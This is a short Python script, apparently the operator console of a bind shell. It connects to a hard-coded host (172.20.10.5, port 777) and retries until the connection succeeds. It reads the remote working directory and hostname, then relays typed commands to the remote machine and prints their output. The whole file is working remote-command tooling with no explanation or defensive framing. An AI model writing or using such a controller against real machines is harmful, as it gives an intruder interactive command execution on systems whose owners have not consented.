import os
import socket
import time

TARGET = "172.20.10.5"

TARGET_PORT = 777

cwd = "cd"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
    try:
        s.connect((TARGET, TARGET_PORT))
        s.sendall(b"cd")
        current_dir = s.recv(8000).decode().strip() + "> "
        s.sendall(b"hostname")
        hostname = s.recv(8000).decode().strip()
        print(f"\n[+] Connected to {hostname}\n")
        break
    except ConnectionRefusedError:
        print("\n[-] ConnectionRefusedError, retrying in 2 secs")
        time.sleep(2)

while True:
    command = input(current_dir)

    if command == "cls":
        os.system("cls")
    elif command == "exit":
        print(f"\n[-] Disconnected from {hostname}")
        break
    else:
        s.send(command.encode())

        output = s.recv(8000)
        print("\n", output.decode())
